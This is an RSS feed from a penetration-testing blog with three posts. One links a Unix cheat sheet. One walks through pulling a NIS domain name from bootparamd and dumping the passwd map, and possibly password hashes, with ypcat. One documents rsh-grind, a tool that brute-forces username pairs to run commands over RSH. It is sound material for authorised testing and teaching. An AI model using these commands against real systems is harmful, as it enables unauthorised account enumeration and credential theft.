<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>unix &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/unix/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Wed, 31 Aug 2011 16:29:04 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>The Ultimate Unix Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/rosetta-stone-for-unix</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 14 Aug 2011 16:13:23 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[audit]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[unix]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=227</guid>

					<description><![CDATA[I just stumbled across Rosetta Stone for Unix, a brilliant page that lists how to do a large number of tasks in a variety of unix-like operating systems.  I wish I&#8217;d found this years ago. It should be very handy for pentesting or auditing those less familiar unix flavours. I&#8217;ll definitely taking a copy with [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I just stumbled across <a href="http://bhami.com/rosetta.html">Rosetta Stone for Unix</a>, a brilliant page that lists how to do a large number of tasks in a variety of unix-like operating systems.  I wish I&#8217;d found this years ago.</p>
<p>It should be very handy for pentesting or auditing those less familiar unix flavours. I&#8217;ll definitely taking a copy with me on future tests.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Finding the NIS Domain Name from Bootparamd</title>
		<link>https://pentestmonkey.net/blog/nis-domain-name</link>
					<comments>https://pentestmonkey.net/blog/nis-domain-name#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 20 Jun 2007 21:29:14 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[bootparamd]]></category>
		<category><![CDATA[nis]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[unix]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=14</guid>

					<description><![CDATA[NIS (Network Information Service) is not a particularly common protocol on modern internal networks. This is for good reason really consider its security weaknesses.  Its presense is often a gift to penetration testers (and probably hackers too).  This blog entry briefly documents one way that all important NIS Domain Name can be found remotely. SATAN [&#8230;]]]></description>
										<content:encoded><![CDATA[<p><a href="http://en.wikipedia.org/wiki/Network_Information_Service">NIS</a> (Network Information Service) is not a particularly common protocol on modern internal networks. This is for good reason really consider its <a href="http://www.unix.geek.org.uk/~arny/">security weaknesses</a>.  Its presense is often a gift to penetration testers (and probably hackers too).  This blog entry briefly documents one way that all important NIS Domain Name can be found remotely.</p>
<p><span id="more-14"></span></p>
<p><a href="http://www.porcupine.org/satan">SATAN</a> includes a nice little tool called &#8220;boot&#8221; which can remotely query the bootparamd service &#8211; often found running on the NIS server.  I tweaked this slightly so that it compiles under Linux (I&#8217;ve only tried it on Gentoo).  Download my hacked up copy <a href="../tools/bootparam-satan/satan-bootparamd-client-ptm-patch.tar.gz">here</a>.</p>
<p>First locate a host that is running both ypserv and bootparamd.  This is invariably a Solaris host, but in this example it&#8217;s Debian:</p>
<pre>
$ rpcinfo -p 192.168.20.128
   program vers proto   port
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp    749  status
    100024    1   tcp    752  status
    100004    2   udp   1017  ypserv
    100004    1   udp   1017  ypserv
    100004    2   tcp   1020  ypserv
    100004    1   tcp   1020  ypserv
    100009    1   udp   1020  yppasswdd
 600100069    1   udp   1022  fypxfrd
 600100069    1   tcp    600  fypxfrd
    100007    2   udp    605  ypbind
    100007    1   udp    605  ypbind
    100007    2   tcp    608  ypbind
    100007    1   tcp    608  ypbind
    100026    1   udp    603  bootparam
</pre>
<p>Now compile and run the bootparam client then query the bootparamd service.</p>
<pre>
$ tar xfz satan-bootparamd-client-ptm-patch.tar.gz
$ cd satan-bootparamd-client-ptm-patch
$ ls -l
total 12
-rw------- 1 ml ml  399 Jun 17 12:50 Makefile
-rw------- 1 ml ml 2461 Jun 17 12:50 boot.c
-rw------- 1 ml ml 3019 Jun 17 12:50 bootparam_prot.x
$ make
</pre>
<p>You need to supply the &#8220;boot&#8221; progam a client and server IP address.</p>
<pre>$ ./boot
Usage: ./boot bootclient bootserver</pre>
<p>In this example at least the server had to be set up specifically set up to serve a ficticious client (by editing /etc/bootparams).  If you get a message like the following, try a different client IP address:</p>
<pre>$ ./boot 192.168.20.99 192.168.20.128
me: cannot contact bootparam server at 192.168.20.128 for 192.168.20.99: RPC: Timed out</pre>
<p>A successful response will look like this:</p>
<pre>$ ./boot 192.168.20.3 192.168.20.128
client_name: someclient
domain_name: mynisdom
router_addr: 192.168.20.128</pre>
<p>Once you have the NIS Domain Name, you can grab the passwd file as follows:</p>
<pre>$ ypcat -h 192.168.20.128 -d mynisdom passwd.byname
user:x:1000:1000:user,,,:/home/user:/bin/bash
ptm:x:1001:100::/home/ptm:</pre>
<p>If you&#8217;re really lucky it&#8217;ll contain the password hashes too (also try to grab shadow.byname if it doesn&#8217;t).</p>
<p>If you&#8217;re unable to extract the NIS domain name from bootparamd, you could try querying other available services (FTP, SMTP, NFS, etc.) in order to find the DNS Domain name or some host names.   The NIS domain name could be similar to the DNS domain name, or to hostnames &#8211; but isn&#8217;t necessarily.  YMMV.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/nis-domain-name/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>rsh-grind</title>
		<link>https://pentestmonkey.net/tools/misc/rsh-grind</link>
					<comments>https://pentestmonkey.net/tools/misc/rsh-grind#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Fri, 10 Nov 2006 22:42:52 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[rshgrind]]></category>
		<category><![CDATA[unix]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=115</guid>

					<description><![CDATA[Basically tries lots of combinations of local and remote usernames to execute commands via RSH. Download SHA1sum: f1b37abb6ad54df775c1cf194ab91fd41d607f1f MD5sum: 2ecae8730f89c697f2512181ded3842f User documentation is also available in PDF format. &#160; rsh-grind User Documentation &#160; Contents Overview Installation Usage Some Examples Assuming Remote Usernames are Same as Local Usernames What if the Local and Remote Usernames are [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Basically tries lots of combinations of local and remote usernames to execute commands via RSH.</p>
<p><a href="/tools/rsh-grind/rsh-grind-0.9.2.tar.gz">Download</a></p>
<p>SHA1sum: f1b37abb6ad54df775c1cf194ab91fd41d607f1f</p>
<p>MD5sum: 2ecae8730f89c697f2512181ded3842f</p>
<p>User documentation is also available in <a href="/tools/rsh-grind/rsh-grind-user-docs.pdf">PDF</a> format.</p>
<p><span id="more-115"></span></p>
<p>&nbsp;</p>
<h1 align="center">rsh-grind User Documentation</h1>
<p>&nbsp;</p>
<h2><a title="SECTION00010000000000000000" name="SECTION00010000000000000000"></a> Contents</h2>
<ul>
<li><a title="tex2html11" name="tex2html11" href="rsh-grind-user-docs.html#SECTION00020000000000000000"></a>Overview</li>
<li><a title="tex2html12" name="tex2html12" href="rsh-grind-user-docs.html#SECTION00030000000000000000"></a>Installation</li>
<li><a title="tex2html13" name="tex2html13" href="rsh-grind-user-docs.html#SECTION00040000000000000000"></a>Usage</li>
<li><a title="tex2html14" name="tex2html14" href="rsh-grind-user-docs.html#SECTION00050000000000000000"></a>Some Examples
<ul>
<li><a title="tex2html15" name="tex2html15" href="rsh-grind-user-docs.html#SECTION00051000000000000000"></a>Assuming Remote Usernames are Same as Local Usernames</li>
<li><a title="tex2html16" name="tex2html16" href="rsh-grind-user-docs.html#SECTION00052000000000000000"></a>What if the Local and Remote Usernames are Different?</li>
</ul>
</li>
<li><a title="tex2html17" name="tex2html17" href="rsh-grind-user-docs.html#SECTION00060000000000000000"></a>License</li>
</ul>
<p>&nbsp;</p>
<h1><a title="SECTION00020000000000000000" name="SECTION00020000000000000000"></a>Overview</h1>
<p>rsh-grind is a tool for remotely enumerating user accounts that are able to use the Remtoe Shell (RSH) protocol. The RSH protocol requires a local and remote username to be supplied. rsh-grind simply works through all possible combinations of local and remote usernames supplied via a wordlist.</p>
<h1><a title="SECTION00030000000000000000" name="SECTION00030000000000000000"></a>Installation</h1>
<p>rsh-grind is just a stand alone PERL script, so installation is as simple as copying it to your path (e.g. /usr/local/bin). It has only been tested under Linux so far.</p>
<p>It depends on the following PERL modules which you may need to install them first:</p>
<ul>
<li>Socket</li>
<li>IO::Handle</li>
<li>IO::Select</li>
<li>IO::Socket</li>
<li>Getopt::Std</li>
<li>POSIX;</li>
</ul>
<p>If you have PERL installed, you should be able to install the modules from CPAN:</p>
<pre> # perl -MCPAN -e shell
 cpan&gt; install Getopt::Std</pre>
<h1><a title="SECTION00040000000000000000" name="SECTION00040000000000000000"></a>Usage</h1>
<p>rsh-grind simply needs to be passed a list of local users, a list of remote users and a list of target RSH servers. Here&#8217;s the usage message:</p>
<pre> Usage: rsh-grind.pl [options] ( -U username_file ) ( -f ips.txt | hostname )
        rsh-grind.pl [options] (-l local_user|-L file) | (-r remote_user|-R file) (-f ips.txt|host) 

 options are:
         -m n     Maximum number of processes (default: 10)
         -l       Local username (on the client)
         -L file  File of local usernames
         -r       Remote username (on the server)
         -R file  File or remote usernames
         -U file  File of usernames.  Each will be used as remote and local
                  user (e.g. root/root, smtp/smtp).  Permutations will not
                  be tried.
         -c cmd   Command to execute (default: id)
                  (Must be non-interactive, so don't try /bin/sh for example)
         -f file  File of target hostnames / IPs
         -t n     Wait a maximum of n seconds for reply (default: 5)
         -d       Debugging output
         -v       Verbose
         -h       This help message 

 The Remote Shell Protocol (RSH) allows remote users to execute commands
 on the server.  Authentication is based on:
 - Source IP Address
 - Remote Username
 - Local Username 

 This script can't help you with obtaining a valid source IP address, but
 it can help you try different combinations of remote and local usernames. 

 If your source IP address is in /etc/hosts.equiv, then you just need a
 valid username on the system, the remote and local usernames should be the
 same. 

 If the remote user account you're attacking has a .rhosts file like the
 following in their home directory, it doesn't matter what the local
 username is:
 IP + 

 In both of the above cases, the most efficient usage is: 

 $ rsh-grind.pl -U users.txt target 

 If the .rhosts looks like the following, though the local username must
 be "foo":
 IP foo 

 In this case you might need to try lots of permutations before you
 hit on the one that works.  The correct usage is: 

 $ rsh-grind.pl -L localusers.txt -R remoteusers.txt target 

 Output lines will be something like:
 10.0.0.1/localuser/remoteuser    _uid=101(remoteuser) gid=1(other)_ 

 Non-printable characters are sqashed to _ to fit whole response on
 one line. 

 NB: The RSH protocol requires the binding of a local privileged port, so
 you need to run this script as root.</pre>
<h1><a title="SECTION00050000000000000000" name="SECTION00050000000000000000"></a>Some Examples</h1>
<p>For the examples below we need a list of potential usernames. The following output demostrates the format for this list:</p>
<pre> $ head users.txt
 root
 bin
 daemon
 adm
 lp
 sync
 shutdown
 halt
 mail
 news</pre>
<h2><a title="SECTION00051000000000000000" name="SECTION00051000000000000000"></a> Assuming Remote Usernames are Same as Local Usernames</h2>
<p>If we assume that users of the RSH protocol will use the same username locally (i.e. where the rsh client is run) and remotely (i.e. on the server which we&#8217;re testing), we only need a single list of usernames.</p>
<pre>  $ sudo rsh-grind.pl -U users.txt 172.16.16.7
 Starting rsh-grind v0.9.2 ( http://pentestmonkey.net/tools/rsh-grind ) 

  ----------------------------------------------------------
 |                   Scan Information                       |
  ---------------------------------------------------------- 

 Processes .............. 10
 Command ................ id
 Target ................. 172.16.16.7
 Usernames file ......... users.txt
 Username count ......... 10
 Query timeout .......... 5 secs 

 ######## Scan started at Sun May  6 18:39:13 2007 #########
 172.16.16.7/bin/bin      _uid=2(bin) gid=2(bin)_
 172.16.16.7/daemon/daemon        _uid=1(daemon) gid=1(other)_
 172.16.16.7/lp/lp        _uid=71(lp) gid=8(lp)_
 172.16.16.7/adm/adm      _uid=4(adm) gid=4(adm)_
 ######## Scan completed at Sun May  6 18:39:14 2007 #########
 4 results. 

 10 queries in 1 seconds (10.0 queries / sec)</pre>
<p>Note that we have to run as root because the RSH protocol requires us to bind to ports below 1024.</p>
<p>The results show 4 pairs of local and remote users that can execute commands via RSH. This usually indicates that user have an entry like the following in their /.rhosts file:</p>
<pre> + myuser</pre>
<p>The + here means that access is allowed from any source IP address.</p>
<p>However, in this case the results are caused by the host running rsh-grind being present in /etc/hosts.equiv (not very likely in the real world, but it demonstrates what results you&#8217;d get with the small list of usernames above).</p>
<h2><a title="SECTION00052000000000000000" name="SECTION00052000000000000000"></a> What if the Local and Remote Usernames are Different?</h2>
<p>The remote username is sometimes different to the local username, e.g. a user fred might have the following in fred/.rhosts:</p>
<pre> + fbloggs</pre>
<p>This means that the remote user fbloggs would be allowed to access fred&#8217;s account from any source IP address.</p>
<p>We simply supply two lists of usernames (often, but not necessarily the same list):</p>
<pre>  $ sudo ./rsh-grind.pl -L localusers.txt -R remoteusers.txt 172.16.16.7
 Starting rsh-grind v0.9.2 ( http://pentestmonkey.net/tools/rsh-grind ) 

  ----------------------------------------------------------
 |                   Scan Information                       |
  ---------------------------------------------------------- 

 Processes .............. 10
 Command ................ id
 Target ................. 172.16.16.7
 Remote usernames file .. localusers.txt
 Local usernames file ... remoteusers.txt
 Remote username count .. 12
 Local username count ... 12
 Query timeout .......... 5 secs 

 ######## Scan started at Sun May  6 18:58:03 2007 #########
 172.16.16.7/fred/fbloggs        _uid=102(fred) gid=1(group)_
 ######## Scan completed at Sun May  6 18:58:09 2007 #########
 0 results. 

 144 queries in 6 seconds (24.0 queries / sec)</pre>
<h1><a title="SECTION00060000000000000000" name="SECTION00060000000000000000"></a>License</h1>
<p>This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.</p>
<p>In all other respects the GPL version 2 applies:</p>
<pre> This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License version 2 as
 published by the Free Software Foundation. 

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details. 

 You should have received a copy of the GNU General Public License along
 with this program; if not, write to the Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/misc/rsh-grind/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
